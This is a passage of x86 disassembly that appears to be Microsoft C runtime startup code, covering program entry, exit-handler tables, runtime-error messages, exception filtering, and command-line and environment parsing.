  424513:	mov    DWORD PTR [ebp-0x1c],eax
  424516:	push   0x1
  424518:	call   0x4252ed
  42451d:	pop    ecx
  42451e:	test   eax,eax
  424520:	jne    0x42452a
  424522:	push   0x1c
  424524:	call   0x42442b
  424529:	pop    ecx
  42452a:	call   0x425264
  42452f:	test   eax,eax
  424531:	jne    0x42453b
  424533:	push   0x10
  424535:	call   0x42442b
  42453a:	pop    ecx
  42453b:	call   0x42514d
  424540:	mov    DWORD PTR [ebp-0x4],esi
  424543:	call   0x424f4f
  424548:	test   eax,eax
  42454a:	jge    0x424554
  42454c:	push   0x1b
  42454e:	call   0x424406
  424553:	pop    ecx
  424554:	call   DWORD PTR ds:0x429050
  42455a:	mov    ds:0x45e274,eax
  42455f:	call   0x424e2d
  424564:	mov    ds:0x45dab4,eax
  424569:	call   0x424d8b
  42456e:	test   eax,eax
  424570:	jge    0x42457a
  424572:	push   0x8
  424574:	call   0x424406
  424579:	pop    ecx
  42457a:	call   0x424b58
  42457f:	test   eax,eax
  424581:	jge    0x42458b
  424583:	push   0x9
  424585:	call   0x424406
  42458a:	pop    ecx
  42458b:	call   0x424663
  424590:	mov    DWORD PTR [ebp-0x20],eax
  424593:	cmp    eax,esi
  424595:	je     0x42459e
  424597:	push   eax
  424598:	call   0x424406
  42459d:	pop    ecx
  42459e:	mov    DWORD PTR [ebp-0x38],esi
  4245a1:	lea    eax,[ebp-0x64]
  4245a4:	push   eax
  4245a5:	call   DWORD PTR ds:0x42904c
  4245ab:	call   0x424aef
  4245b0:	mov    DWORD PTR [ebp-0x68],eax
  4245b3:	test   BYTE PTR [ebp-0x38],0x1
  4245b7:	je     0x4245bf
  4245b9:	movzx  eax,WORD PTR [ebp-0x34]
  4245bd:	jmp    0x4245c2
  4245bf:	push   0xa
  4245c1:	pop    eax
  4245c2:	push   eax
  4245c3:	push   DWORD PTR [ebp-0x68]
  4245c6:	push   esi
  4245c7:	push   esi
  4245c8:	call   edi
  4245ca:	push   eax
  4245cb:	call   0x422f80
  4245d0:	mov    edi,eax
  4245d2:	mov    DWORD PTR [ebp-0x6c],edi
  4245d5:	cmp    DWORD PTR [ebp-0x1c],esi
  4245d8:	jne    0x4245e0
  4245da:	push   edi
  4245db:	call   0x42479b
  4245e0:	call   0x4247bd
  4245e5:	jmp    0x424612
  4245e7:	mov    eax,DWORD PTR [ebp-0x14]
  4245ea:	mov    ecx,DWORD PTR [eax]
  4245ec:	mov    ecx,DWORD PTR [ecx]
  4245ee:	mov    DWORD PTR [ebp-0x70],ecx
  4245f1:	push   eax
  4245f2:	push   ecx
  4245f3:	call   0x42498b
  4245f8:	pop    ecx
  4245f9:	pop    ecx
  4245fa:	ret    
  4245fb:	mov    esp,DWORD PTR [ebp-0x18]
  4245fe:	mov    edi,DWORD PTR [ebp-0x70]
  424601:	cmp    DWORD PTR [ebp-0x1c],0x0
  424605:	jne    0x42460d
  424607:	push   edi
  424608:	call   0x4247ac
  42460d:	call   0x4247cc
  424612:	or     DWORD PTR [ebp-0x4],0xffffffff
  424616:	mov    eax,edi
  424618:	lea    esp,[ebp-0x7c]
  42461b:	call   0x42537b
  424620:	ret    
  424621:	push   0x42923c
  424626:	call   DWORD PTR ds:0x429024
  42462c:	test   eax,eax
  42462e:	je     0x424646
  424630:	push   0x42922c
  424635:	push   eax
  424636:	call   DWORD PTR ds:0x429020
  42463c:	test   eax,eax
  42463e:	je     0x424646
  424640:	push   DWORD PTR [esp+0x4]
  424644:	call   eax
  424646:	push   DWORD PTR [esp+0x4]
  42464a:	call   DWORD PTR ds:0x429058
  424650:	int3   
  424651:	push   0x8
  424653:	call   0x4254ff
  424658:	pop    ecx
  424659:	ret    
  42465a:	push   0x8
  42465c:	call   0x42546b
  424661:	pop    ecx
  424662:	ret    
  424663:	mov    eax,ds:0x45e270
  424668:	test   eax,eax
  42466a:	je     0x42466e
  42466c:	call   eax
  42466e:	push   esi
  42466f:	push   edi
  424670:	mov    ecx,0x42b00c
  424675:	mov    edi,0x42b018
  42467a:	xor    eax,eax
  42467c:	cmp    ecx,edi
  42467e:	mov    esi,ecx
  424680:	jae    0x424699
  424682:	test   eax,eax
  424684:	jne    0x4246c5
  424686:	mov    ecx,DWORD PTR [esi]
  424688:	test   ecx,ecx
  42468a:	je     0x42468e
  42468c:	call   ecx
  42468e:	add    esi,0x4
  424691:	cmp    esi,edi
  424693:	jb     0x424682
  424695:	test   eax,eax
  424697:	jne    0x4246c5
  424699:	push   0x425191
  42469e:	call   0x425610
  4246a3:	mov    esi,0x42b000
  4246a8:	mov    eax,esi
  4246aa:	mov    edi,0x42b008
  4246af:	cmp    eax,edi
  4246b1:	pop    ecx
  4246b2:	jae    0x4246c3
  4246b4:	mov    eax,DWORD PTR [esi]
  4246b6:	test   eax,eax
  4246b8:	je     0x4246bc
  4246ba:	call   eax
  4246bc:	add    esi,0x4
  4246bf:	cmp    esi,edi
  4246c1:	jb     0x4246b4
  4246c3:	xor    eax,eax
  4246c5:	pop    edi
  4246c6:	pop    esi
  4246c7:	ret    
  4246c8:	push   ebp
  4246c9:	mov    ebp,esp
  4246cb:	push   esi
  4246cc:	push   edi
  4246cd:	push   0x8
  4246cf:	call   0x4254ff
  4246d4:	xor    esi,esi
  4246d6:	inc    esi
  4246d7:	cmp    DWORD PTR ds:0x45db04,esi
  4246dd:	pop    ecx
  4246de:	jne    0x4246f0
  4246e0:	push   DWORD PTR [ebp+0x8]
  4246e3:	call   DWORD PTR ds:0x429060
  4246e9:	push   eax
  4246ea:	call   DWORD PTR ds:0x42905c
  4246f0:	cmp    DWORD PTR [ebp+0xc],0x0
  4246f4:	mov    al,BYTE PTR [ebp+0x10]
  4246f7:	mov    DWORD PTR ds:0x45db00,esi
  4246fd:	mov    ds:0x45dafc,al
  424702:	jne    0x424756
  424704:	mov    ecx,DWORD PTR ds:0x45e268
  42470a:	test   ecx,ecx
  42470c:	je     0x424737
  42470e:	mov    eax,ds:0x45e264
  424713:	sub    eax,0x4
  424716:	cmp    eax,ecx
  424718:	jmp    0x424730
  42471a:	mov    eax,DWORD PTR [eax]
  42471c:	test   eax,eax
  42471e:	je     0x424722
  424720:	call   eax
  424722:	mov    eax,ds:0x45e264
  424727:	sub    eax,0x4
  42472a:	cmp    eax,DWORD PTR ds:0x45e268
  424730:	mov    ds:0x45e264,eax
  424735:	jae    0x42471a
  424737:	mov    eax,0x42b01c
  42473c:	mov    esi,0x42b020
  424741:	cmp    eax,esi
  424743:	mov    edi,eax
  424745:	jae    0x424756
  424747:	mov    eax,DWORD PTR [edi]
  424749:	test   eax,eax
  42474b:	je     0x42474f
  42474d:	call   eax
  42474f:	add    edi,0x4
  424752:	cmp    edi,esi
  424754:	jb     0x424747
  424756:	mov    eax,0x42b024
  42475b:	mov    esi,0x42b028
  424760:	cmp    eax,esi
  424762:	mov    edi,eax
  424764:	jae    0x424775
  424766:	mov    eax,DWORD PTR [edi]
  424768:	test   eax,eax
  42476a:	je     0x42476e
  42476c:	call   eax
  42476e:	add    edi,0x4
  424771:	cmp    edi,esi
  424773:	jb     0x424766
  424775:	cmp    DWORD PTR [ebp+0x10],0x0
  424779:	pop    edi
  42477a:	pop    esi
  42477b:	je     0x424786
  42477d:	push   0x8
  42477f:	call   0x42546b
  424784:	jmp    0x424798
  424786:	push   DWORD PTR [ebp+0x8]
  424789:	mov    DWORD PTR ds:0x45db04,0x1
  424793:	call   0x424621
  424798:	pop    ecx
  424799:	pop    ebp
  42479a:	ret    
  42479b:	push   0x0
  42479d:	push   0x0
  42479f:	push   DWORD PTR [esp+0xc]
  4247a3:	call   0x4246c8
  4247a8:	add    esp,0xc
  4247ab:	ret    
  4247ac:	push   0x0
  4247ae:	push   0x1
  4247b0:	push   DWORD PTR [esp+0xc]
  4247b4:	call   0x4246c8
  4247b9:	add    esp,0xc
  4247bc:	ret    
  4247bd:	push   0x1
  4247bf:	push   0x0
  4247c1:	push   0x0
  4247c3:	call   0x4246c8
  4247c8:	add    esp,0xc
  4247cb:	ret    
  4247cc:	push   0x1
  4247ce:	push   0x1
  4247d0:	push   0x0
  4247d2:	call   0x4246c8
  4247d7:	add    esp,0xc
  4247da:	ret    
  4247db:	push   ebp
  4247dc:	mov    ebp,esp
  4247de:	sub    esp,0x10c
  4247e4:	mov    eax,ds:0x45d430
  4247e9:	xor    eax,DWORD PTR [ebp+0x4]
  4247ec:	mov    ecx,DWORD PTR [ebp+0x8]
  4247ef:	push   ebx
  4247f0:	push   esi
  4247f1:	mov    DWORD PTR [ebp-0x4],eax
  4247f4:	xor    edx,edx
  4247f6:	push   edi
  4247f7:	xor    eax,eax
  4247f9:	cmp    ecx,DWORD PTR [eax*8+0x45d1c8]
  424800:	je     0x424808
  424802:	inc    eax
  424803:	cmp    eax,0x12
  424806:	jb     0x4247f9
  424808:	mov    esi,eax
  42480a:	shl    esi,0x3
  42480d:	cmp    ecx,DWORD PTR [esi+0x45d1c8]
  424813:	jne    0x42493c
  424819:	mov    eax,ds:0x45dabc
  42481e:	cmp    eax,0x1
  424821:	je     0x424917
  424827:	cmp    eax,edx
  424829:	jne    0x424838
  42482b:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424832:	je     0x424917
  424838:	cmp    ecx,0xfc
  42483e:	je     0x42493c
  424844:	push   0x104
  424849:	lea    eax,[ebp-0x10c]
  42484f:	push   eax
  424850:	push   edx
  424851:	mov    BYTE PTR [ebp-0x8],dl
  424854:	call   DWORD PTR ds:0x429068
  42485a:	test   eax,eax
  42485c:	jne    0x424871
  42485e:	lea    eax,[ebp-0x10c]
  424864:	push   0x429594
  424869:	push   eax
  42486a:	call   0x425720
  42486f:	pop    ecx
  424870:	pop    ecx
  424871:	lea    eax,[ebp-0x10c]
  424877:	push   eax
  424878:	lea    edi,[ebp-0x10c]
  42487e:	call   0x425950
  424883:	inc    eax
  424884:	cmp    eax,0x3c
  424887:	pop    ecx
  424888:	jbe    0x4248b3
  42488a:	lea    eax,[ebp-0x10c]
  424890:	push   eax
  424891:	call   0x425950
  424896:	mov    edi,eax
  424898:	lea    eax,[ebp-0x10c]
  42489e:	sub    eax,0x3b
  4248a1:	push   0x3
  4248a3:	add    edi,eax
  4248a5:	push   0x429590
  4248aa:	push   edi
  4248ab:	call   0x425820
  4248b0:	add    esp,0x10
  4248b3:	push   edi
  4248b4:	call   0x425950
  4248b9:	push   DWORD PTR [esi+0x45d1cc]
  4248bf:	mov    ebx,eax
  4248c1:	call   0x425950
  4248c6:	lea    eax,[ebx+eax*1+0x1c]
  4248ca:	pop    ecx
  4248cb:	add    eax,0x3
  4248ce:	pop    ecx
  4248cf:	and    eax,0xfffffffc
  4248d2:	call   0x425390
  4248d7:	mov    ebx,esp
  4248d9:	push   0x429574
  4248de:	push   ebx
  4248df:	call   0x425720
  4248e4:	push   edi
  4248e5:	push   ebx
  4248e6:	call   0x425730
  4248eb:	push   0x429570
  4248f0:	push   ebx
  4248f1:	call   0x425730
  4248f6:	push   DWORD PTR [esi+0x45d1cc]
  4248fc:	push   ebx
  4248fd:	call   0x425730
  424902:	push   0x12010
  424907:	push   0x429548
  42490c:	push   ebx
  42490d:	call   0x425622
  424912:	add    esp,0x2c
  424915:	jmp    0x42493c
  424917:	push   edx
  424918:	lea    eax,[ebp+0x8]
  42491b:	push   eax
  42491c:	lea    esi,[esi+0x45d1cc]
  424922:	push   DWORD PTR [esi]
  424924:	call   0x425950
  424929:	pop    ecx
  42492a:	push   eax
  42492b:	push   DWORD PTR [esi]
  42492d:	push   0xfffffff4
  42492f:	call   DWORD PTR ds:0x429064
  424935:	push   eax
  424936:	call   DWORD PTR ds:0x42900c
  42493c:	lea    esp,[ebp-0x118]
  424942:	mov    ecx,DWORD PTR [ebp-0x4]
  424945:	xor    ecx,DWORD PTR [ebp+0x4]
  424948:	call   0x425a0c
  42494d:	pop    edi
  42494e:	pop    esi
  42494f:	pop    ebx
  424950:	leave  
  424951:	ret    
  424952:	mov    eax,ds:0x45dabc
  424957:	cmp    eax,0x1
  42495a:	je     0x424969
  42495c:	test   eax,eax
  42495e:	jne    0x42498a
  424960:	cmp    DWORD PTR ds:0x45d1c4,0x1
  424967:	jne    0x42498a
  424969:	push   0xfc
  42496e:	call   0x4247db
  424973:	mov    eax,ds:0x45db08
  424978:	test   eax,eax
  42497a:	pop    ecx
  42497b:	je     0x42497f
  42497d:	call   eax
  42497f:	push   0xff
  424984:	call   0x4247db
  424989:	pop    ecx
  42498a:	ret    
  42498b:	push   ebp
  42498c:	mov    ebp,esp
  42498e:	push   ecx
  42498f:	push   ebx
  424990:	push   esi
  424991:	push   edi
  424992:	call   0x4251f3
  424997:	mov    edi,DWORD PTR [ebp+0x8]
  42499a:	mov    esi,eax
  42499c:	mov    edx,DWORD PTR [esi+0x54]
  42499f:	mov    eax,ds:0x45d2dc
  4249a4:	mov    ecx,edx
  4249a6:	cmp    DWORD PTR [ecx],edi
  4249a8:	je     0x4249b7
  4249aa:	lea    ebx,[eax+eax*2]
  4249ad:	add    ecx,0xc
  4249b0:	lea    ebx,[edx+ebx*4]
  4249b3:	cmp    ecx,ebx
  4249b5:	jb     0x4249a6
  4249b7:	lea    eax,[eax+eax*2]
  4249ba:	lea    eax,[edx+eax*4]
  4249bd:	cmp    ecx,eax
  4249bf:	jae    0x4249c5
  4249c1:	cmp    DWORD PTR [ecx],edi
  4249c3:	je     0x4249c7
  4249c5:	xor    ecx,ecx
  4249c7:	test   ecx,ecx
  4249c9:	je     0x424ae1
  4249cf:	mov    ebx,DWORD PTR [ecx+0x8]
  4249d2:	test   ebx,ebx
  4249d4:	mov    DWORD PTR [ebp+0x8],ebx
  4249d7:	je     0x424ae1
  4249dd:	cmp    ebx,0x5
  4249e0:	jne    0x4249ee
  4249e2:	and    DWORD PTR [ecx+0x8],0x0
  4249e6:	xor    eax,eax
  4249e8:	inc    eax
  4249e9:	jmp    0x424aea
  4249ee:	cmp    ebx,0x1
  4249f1:	je     0x424adc
  4249f7:	mov    eax,DWORD PTR [esi+0x58]
  4249fa:	mov    DWORD PTR [ebp-0x4],eax
  4249fd:	mov    eax,DWORD PTR [ebp+0xc]
  424a00:	mov    DWORD PTR [esi+0x58],eax
  424a03:	mov    eax,DWORD PTR [ecx+0x4]
  424a06:	cmp    eax,0x8
  424a09:	jne    0x424ace
  424a0f:	mov    edx,DWORD PTR ds:0x45d2d0
  424a15:	mov    eax,ds:0x45d2d4
  424a1a:	add    eax,edx
  424a1c:	cmp    edx,eax
  424a1e:	jge    0x424a47
  424a20:	lea    eax,[edx+edx*2]
  424a23:	shl    eax,0x2
  424a26:	mov    edi,DWORD PTR [esi+0x54]
  424a29:	and    DWORD PTR [eax+edi*1+0x8],0x0
  424a2e:	mov    edi,DWORD PTR ds:0x45d2d0
  424a34:	mov    ebx,DWORD PTR ds:0x45d2d4
  424a3a:	inc    edx
  424a3b:	add    ebx,edi
  424a3d:	add    eax,0xc
  424a40:	cmp    edx,ebx
  424a42:	jl     0x424a26
  424a44:	mov    ebx,DWORD PTR [ebp+0x8]
  424a47:	mov    ecx,DWORD PTR [ecx]
  424a49:	cmp    ecx,0xc000008e
  424a4f:	mov    edi,DWORD PTR [esi+0x5c]
  424a52:	jne    0x424a5d
  424a54:	mov    DWORD PTR [esi+0x5c],0x83
  424a5b:	jmp    0x424ac1
  424a5d:	cmp    ecx,0xc0000090
  424a63:	jne    0x424a6e
  424a65:	mov    DWORD PTR [esi+0x5c],0x81
  424a6c:	jmp    0x424ac1
  424a6e:	cmp    ecx,0xc0000091
  424a74:	jne    0x424a7f
  424a76:	mov    DWORD PTR [esi+0x5c],0x84
  424a7d:	jmp    0x424ac1
  424a7f:	cmp    ecx,0xc0000093
  424a85:	jne    0x424a90
  424a87:	mov    DWORD PTR [esi+0x5c],0x85
  424a8e:	jmp    0x424ac1
  424a90:	cmp    ecx,0xc000008d
  424a96:	jne    0x424aa1
  424a98:	mov    DWORD PTR [esi+0x5c],0x82
  424a9f:	jmp    0x424ac1
  424aa1:	cmp    ecx,0xc000008f
  424aa7:	jne    0x424ab2
  424aa9:	mov    DWORD PTR [esi+0x5c],0x86
  424ab0:	jmp    0x424ac1
  424ab2:	cmp    ecx,0xc0000092
  424ab8:	jne    0x424ac1
  424aba:	mov    DWORD PTR [esi+0x5c],0x8a
  424ac1:	push   DWORD PTR [esi+0x5c]
  424ac4:	push   0x8
  424ac6:	call   ebx
  424ac8:	pop    ecx
  424ac9:	mov    DWORD PTR [esi+0x5c],edi
  424acc:	jmp    0x424ad5
  424ace:	and    DWORD PTR [ecx+0x8],0x0
  424ad2:	push   eax
  424ad3:	call   ebx
  424ad5:	mov    eax,DWORD PTR [ebp-0x4]
  424ad8:	pop    ecx
  424ad9:	mov    DWORD PTR [esi+0x58],eax
  424adc:	or     eax,0xffffffff
  424adf:	jmp    0x424aea
  424ae1:	push   DWORD PTR [ebp+0xc]
  424ae4:	call   DWORD PTR ds:0x42906c
  424aea:	pop    edi
  424aeb:	pop    esi
  424aec:	pop    ebx
  424aed:	leave  
  424aee:	ret    
  424aef:	cmp    DWORD PTR ds:0x45e26c,0x0
  424af6:	jne    0x424afd
  424af8:	call   0x425f2c
  424afd:	push   esi
  424afe:	mov    esi,DWORD PTR ds:0x45e274
  424b04:	test   esi,esi
  424b06:	jne    0x424b0f
  424b08:	mov    esi,0x4295ab
  424b0d:	jmp    0x424b54
  424b0f:	mov    al,BYTE PTR [esi]
  424b11:	cmp    al,0x22
  424b13:	jne    0x424b3d
  424b15:	inc    esi
  424b16:	mov    al,BYTE PTR [esi]
  424b18:	cmp    al,0x22
  424b1a:	je     0x424b4d
  424b1c:	test   al,al
  424b1e:	je     0x424b36
  424b20:	movzx  eax,al
  424b23:	push   eax
  424b24:	call   0x425a4b
  424b29:	test   eax,eax
  424b2b:	pop    ecx
  424b2c:	je     0x424b2f
  424b2e:	inc    esi
  424b2f:	inc    esi
  424b30:	mov    al,BYTE PTR [esi]
  424b32:	cmp    al,0x22
  424b34:	jne    0x424b1c
  424b36:	cmp    BYTE PTR [esi],0x22
  424b39:	jne    0x424b4e
  424b3b:	jmp    0x424b4d
  424b3d:	cmp    al,0x20
  424b3f:	jbe    0x424b4e
  424b41:	inc    esi
  424b42:	cmp    BYTE PTR [esi],0x20
  424b45:	ja     0x424b41
  424b47:	jmp    0x424b4e
  424b49:	cmp    al,0x20
  424b4b:	ja     0x424b54
  424b4d:	inc    esi
  424b4e:	mov    al,BYTE PTR [esi]
  424b50:	test   al,al
  424b52:	jne    0x424b49
  424b54:	mov    eax,esi
  424b56:	pop    esi
  424b57:	ret    
  424b58:	push   ebx
  424b59:	xor    ebx,ebx
  424b5b:	cmp    DWORD PTR ds:0x45e26c,ebx
  424b61:	push   esi
  424b62:	push   edi
  424b63:	jne    0x424b6a
  424b65:	call   0x425f2c
  424b6a:	mov    esi,DWORD PTR ds:0x45dab4
  424b70:	xor    edi,edi
  424b72:	cmp    esi,ebx
  424b74:	jne    0x424b88
  424b76:	jmp    0x424ba8
  424b78:	cmp    al,0x3d
  424b7a:	je     0x424b7d
  424b7c:	inc    edi
  424b7d:	push   esi
  424b7e:	call   0x425950
  424b83:	pop    ecx
  424b84:	lea    esi,[esi+eax*1+0x1]
  424b88:	mov    al,BYTE PTR [esi]
  424b8a:	cmp    al,bl
  424b8c:	jne    0x424b78
  424b8e:	lea    eax,[edi*4+0x4]
  424b95:	push   eax
  424b96:	call   0x426062
  424b9b:	mov    edi,eax
  424b9d:	cmp    edi,ebx
  424b9f:	pop    ecx
  424ba0:	mov    DWORD PTR ds:0x45dae4,edi
  424ba6:	jne    0x424bad
  424ba8:	or     eax,0xffffffff
  424bab:	jmp    0x424c05
  424bad:	mov    esi,DWORD PTR ds:0x45dab4
  424bb3:	push   ebp
  424bb4:	jmp    0x424be0
  424bb6:	push   esi
  424bb7:	call   0x425950
  424bbc:	mov    ebp,eax
  424bbe:	inc    ebp
  424bbf:	cmp    BYTE PTR [esi],0x3d
  424bc2:	pop    ecx
  424bc3:	je     0x424bde
  424bc5:	push   ebp
  424bc6:	call   0x426062
  424bcb:	cmp    eax,ebx
  424bcd:	pop    ecx
  424bce:	mov    DWORD PTR [edi],eax
  424bd0:	je     0x424c09
  424bd2:	push   esi
  424bd3:	push   eax
  424bd4:	call   0x425720
  424bd9:	pop    ecx
  424bda:	pop    ecx
  424bdb:	add    edi,0x4
  424bde:	add    esi,ebp
  424be0:	cmp    BYTE PTR [esi],bl
  424be2:	jne    0x424bb6
  424be4:	push   DWORD PTR ds:0x45dab4
  424bea:	call   0x425f4a
  424bef:	mov    DWORD PTR ds:0x45dab4,ebx
  424bf5:	mov    DWORD PTR [edi],ebx
  424bf7:	mov    DWORD PTR ds:0x45e260,0x1
  424c01:	xor    eax,eax
  424c03:	pop    ecx
  424c04:	pop    ebp
  424c05:	pop    edi
  424c06:	pop    esi
  424c07:	pop    ebx
  424c08:	ret    
  424c09:	push   DWORD PTR ds:0x45dae4
  424c0f:	call   0x425f4a
  424c14:	mov    DWORD PTR ds:0x45dae4,ebx
  424c1a:	or     eax,0xffffffff
  424c1d:	jmp    0x424c03
  424c1f:	push   ebp
  424c20:	mov    ebp,esp
  424c22:	push   ecx
  424c23:	push   ebx
  424c24:	mov    ebx,DWORD PTR [ebp+0xc]
  424c27:	xor    edx,edx
  424c29:	cmp    DWORD PTR [ebp+0x8],edx
  424c2c:	push   edi
  424c2d:	mov    DWORD PTR [esi],edx
  424c2f:	mov    edi,ecx
  424c31:	mov    DWORD PTR [ebx],0x1
  424c37:	je     0x424c42
  424c39:	mov    ecx,DWORD PTR [ebp+0x8]
  424c3c:	add    DWORD PTR [ebp+0x8],0x4
  424c40:	mov    DWORD PTR [ecx],edi
  424c42:	cmp    BYTE PTR [eax],0x22
  424c45:	jne    0x424c55
  424c47:	xor    ecx,ecx
  424c49:	test   edx,edx
  424c4b:	sete   cl
  424c4e:	inc    eax
  424c4f:	mov    edx,ecx
  424c51:	mov    cl,0x22
  424c53:	jmp    0x424c82
  424c55:	inc    DWORD PTR [esi]
  424c57:	test   edi,edi
  424c59:	je     0x424c60
  424c5b:	mov    cl,BYTE PTR [eax]
  424c5d:	mov    BYTE PTR [edi],cl
  424c5f:	inc    edi
  424c60:	mov    cl,BYTE PTR [eax]
  424c62:	movzx  ebx,cl
  424c65:	inc    eax
  424c66:	test   BYTE PTR [ebx+0x45df21],0x4
  424c6d:	je     0x424c7b
  424c6f:	inc    DWORD PTR [esi]
  424c71:	test   edi,edi
  424c73:	je     0x424c7a
  424c75:	mov    bl,BYTE PTR [eax]
  424c77:	mov    BYTE PTR [edi],bl
  424c79:	inc    edi
  424c7a:	inc    eax
  424c7b:	test   cl,cl
  424c7d:	mov    ebx,DWORD PTR [ebp+0xc]
  424c80:	je     0x424cb4
  424c82:	test   edx,edx
  424c84:	jne    0x424c42
  424c86:	cmp    cl,0x20
  424c89:	je     0x424c90
  424c8b:	cmp    cl,0x9
  424c8e:	jne    0x424c42
  424c90:	test   edi,edi
  424c92:	je     0x424c98
  424c94:	and    BYTE PTR [edi-0x1],0x0
  424c98:	and    DWORD PTR [ebp-0x4],0x0
  424c9c:	cmp    BYTE PTR [eax],0x0
  424c9f:	je     0x424d7b
  424ca5:	mov    cl,BYTE PTR [eax]
  424ca7:	cmp    cl,0x20
  424caa:	je     0x424cb1
  424cac:	cmp    cl,0x9
  424caf:	jne    0x424cb7
  424cb1:	inc    eax
  424cb2:	jmp    0x424ca5
  424cb4:	dec    eax
  424cb5:	jmp    0x424c98
  424cb7:	cmp    BYTE PTR [eax],0x0
  424cba:	je     0x424d7b
  424cc0:	cmp    DWORD PTR [ebp+0x8],0x0
  424cc4:	je     0x424ccf
  424cc6:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc9:	add    DWORD PTR [ebp+0x8],0x4
  424ccd:	mov    DWORD PTR [ecx],edi
  424ccf:	inc    DWORD PTR [ebx]
  424cd1:	xor    ebx,ebx
  424cd3:	inc    ebx
  424cd4:	xor    edx,edx
  424cd6:	jmp    0x424cda
  424cd8:	inc    eax
  424cd9:	inc    edx
  424cda:	cmp    BYTE PTR [eax],0x5c
  424cdd:	je     0x424cd8
  424cdf:	cmp    BYTE PTR [eax],0x22
  424ce2:	jne    0x424d0a
  424ce4:	test   dl,0x1
  424ce7:	jne    0x424d08
  424ce9:	cmp    DWORD PTR [ebp-0x4],0x0
  424ced:	je     0x424cfb
  424cef:	lea    ecx,[eax+0x1]
  424cf2:	cmp    BYTE PTR [ecx],0x22
  424cf5:	jne    0x424cfb
  424cf7:	mov    eax,ecx
  424cf9:	jmp    0x424cfd
  424cfb:	xor    ebx,ebx
  424cfd:	xor    ecx,ecx
  424cff:	cmp    DWORD PTR [ebp-0x4],ecx
  424d02:	sete   cl
  424d05:	mov    DWORD PTR [ebp-0x4],ecx
  424d08:	shr    edx,1
  424d0a:	test   edx,edx
  424d0c:	je     0x424d1b
  424d0e:	test   edi,edi
  424d10:	je     0x424d16
  424d12:	mov    BYTE PTR [edi],0x5c
  424d15:	inc    edi
  424d16:	inc    DWORD PTR [esi]
  424d18:	dec    edx
  424d19:	jne    0x424d0e
  424d1b:	mov    cl,BYTE PTR [eax]
  424d1d:	test   cl,cl
  424d1f:	je     0x424d69
  424d21:	cmp    DWORD PTR [ebp-0x4],0x0
  424d25:	jne    0x424d31
  424d27:	cmp    cl,0x20
  424d2a:	je     0x424d69
  424d2c:	cmp    cl,0x9
  424d2f:	je     0x424d69
  424d31:	test   ebx,ebx
  424d33:	je     0x424d63
  424d35:	test   edi,edi
  424d37:	je     0x424d52
  424d39:	movzx  edx,cl
  424d3c:	test   BYTE PTR [edx+0x45df21],0x4
  424d43:	je     0x424d4b
  424d45:	mov    BYTE PTR [edi],cl
  424d47:	inc    edi
  424d48:	inc    eax
  424d49:	inc    DWORD PTR [esi]
  424d4b:	mov    cl,BYTE PTR [eax]
  424d4d:	mov    BYTE PTR [edi],cl
  424d4f:	inc    edi
  424d50:	jmp    0x424d61
  424d52:	movzx  ecx,cl
  424d55:	test   BYTE PTR [ecx+0x45df21],0x4
  424d5c:	je     0x424d61
  424d5e:	inc    eax
  424d5f:	inc    DWORD PTR [esi]
  424d61:	inc    DWORD PTR [esi]
  424d63:	inc    eax
  424d64:	jmp    0x424cd1
  424d69:	test   edi,edi
  424d6b:	je     0x424d71
  424d6d:	and    BYTE PTR [edi],0x0
  424d70:	inc    edi
  424d71:	inc    DWORD PTR [esi]
  424d73:	mov    ebx,DWORD PTR [ebp+0xc]
  424d76:	jmp    0x424c9c
  424d7b:	mov    eax,DWORD PTR [ebp+0x8]
  424d7e:	test   eax,eax
  424d80:	je     0x424d85
  424d82:	and    DWORD PTR [eax],0x0
  424d85:	inc    DWORD PTR [ebx]
  424d87:	pop    edi
  424d88:	pop    ebx
  424d89:	leave  
  424d8a:	ret    
  424d8b:	push   ebp
  424d8c:	mov    ebp,esp
  424d8e:	push   ecx
  424d8f:	push   ecx
  424d90:	push   ebx
  424d91:	push   esi
  424d92:	push   edi
  424d93:	xor    edi,edi
  424d95:	cmp    DWORD PTR ds:0x45e26c,edi
  424d9b:	jne    0x424da2
  424d9d:	call   0x425f2c
  424da2:	and    BYTE PTR ds:0x45dc14,0x0
  424da9:	push   0x104
  424dae:	mov    esi,0x45db10
  424db3:	push   esi
  424db4:	push   edi
  424db5:	call   DWORD PTR ds:0x429068
  424dbb:	mov    eax,ds:0x45e274
  424dc0:	cmp    eax,edi
  424dc2:	mov    DWORD PTR ds:0x45daf4,esi
  424dc8:	je     0x424dd1
  424dca:	cmp    BYTE PTR [eax],0x0
  424dcd:	mov    ebx,eax
  424dcf:	jne    0x424dd3
  424dd1:	mov    ebx,esi
  424dd3:	lea    eax,[ebp-0x4]
  424dd6:	push   eax
  424dd7:	push   edi
  424dd8:	lea    esi,[ebp-0x8]
  424ddb:	xor    ecx,ecx
  424ddd:	mov    eax,ebx
  424ddf:	call   0x424c1f
  424de4:	mov    esi,DWORD PTR [ebp-0x4]
  424de7:	mov    eax,DWORD PTR [ebp-0x8]
  424dea:	shl    esi,0x2
  424ded:	add    eax,esi
  424def:	push   eax
  424df0:	call   0x426062
  424df5:	mov    edi,eax
  424df7:	add    esp,0xc
  424dfa:	test   edi,edi
  424dfc:	jne    0x424e03
  424dfe:	or     eax,0xffffffff
  424e01:	jmp    0x424e28
  424e03:	lea    eax,[ebp-0x4]
  424e06:	push   eax
  424e07:	lea    ecx,[esi+edi*1]
  424e0a:	push   edi
  424e0b:	lea    esi,[ebp-0x8]
  424e0e:	mov    eax,ebx
  424e10:	call   0x424c1f
  424e15:	mov    eax,DWORD PTR [ebp-0x4]
  424e18:	dec    eax
  424e19:	pop    ecx
  424e1a:	mov    ds:0x45dad8,eax
  424e1f:	pop    ecx
  424e20:	mov    DWORD PTR ds:0x45dadc,edi
  424e26:	xor    eax,eax
  424e28:	pop    edi
  424e29:	pop    esi
  424e2a:	pop    ebx
  424e2b:	leave  
  424e2c:	ret    
  424e2d:	push   ecx
  424e2e:	push   ecx
  424e2f:	mov    eax,ds:0x45dc18
  424e34:	push   ebx
  424e35:	push   ebp
  424e36:	push   esi
  424e37:	push   edi
  424e38:	mov    edi,DWORD PTR ds:0x429080
  424e3e:	xor    ebx,ebx
  424e40:	xor    esi,esi
  424e42:	cmp    eax,ebx
  424e44:	push   0x2
  424e46:	pop    ebp
  424e47:	jne    0x424e76
  424e49:	call   edi
  424e4b:	mov    esi,eax
  424e4d:	cmp    esi,ebx
  424e4f:	je     0x424e5d
  424e51:	mov    DWORD PTR ds:0x45dc18,0x1
  424e5b:	jmp    0x424e7b
  424e5d:	call   DWORD PTR ds:0x429044
  424e63:	cmp    eax,0x78
